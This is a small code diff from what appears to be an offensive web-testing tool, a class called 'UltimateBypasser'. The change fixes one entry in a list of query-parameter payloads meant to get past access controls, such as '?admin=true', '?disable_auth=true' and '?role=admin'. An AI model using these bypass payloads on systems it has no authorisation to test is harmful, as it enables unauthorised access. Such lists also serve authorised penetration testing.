@@ -72,7 +72,7 @@ class UltimateBypasser:
 
         # 5. EXPANDED QUERY PARAMETER BYPASSES
         params = [
-            "?debug=true", "?debug=1","debug=yes", "?admin=true", "?admin=1", "?is_admin=true","?user=admin","?verify=false","?format=yaml",
+            "?debug=true", "?debug=1","?debug=yes", "?admin=true", "?admin=1", "?is_admin=true","?user=admin","?verify=false","?format=yaml",
             "?format=txt", "?extend=true", "#extend", "?public=true", "?is_public=true", "?public=1", "?is_public=1", "?trace=1", "?trace=true",
             "?method=json", "?format=json","?output=json", "?_method=GET", "?_method=POST","?_method=PUT","?privilege=admin","?validate=false",
             "?role=admin", "?env=dev","?env=test","?staging=true", "?bypass=true", "?disable_auth=true", "?show_all=true","?trace=true","?v=1",
